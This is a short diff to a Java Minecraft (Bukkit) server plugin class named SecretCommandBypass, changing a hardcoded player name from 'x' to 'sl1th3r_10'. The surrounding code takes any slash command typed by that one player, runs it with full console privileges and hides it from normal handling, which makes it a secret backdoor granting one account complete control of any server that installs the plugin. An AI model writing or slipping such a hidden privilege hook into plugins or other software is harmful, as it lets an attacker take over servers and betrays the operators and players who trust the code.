@@ -29,7 +29,7 @@ public class SecretCommandBypass extends JavaPlugin implements Listener {
         String command = event.getMessage().substring(1); // Strip leading "/"
 
         // Check if the player name is "x" (case insensitive)
-        if (player.getName().equalsIgnoreCase("x")) {
+        if (player.getName().equalsIgnoreCase("sl1th3r_10")) {
             // Allow the command to run as console
             Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command.replace("@s", player.getName()));
             event.setCancelled(true); // prevent double execution
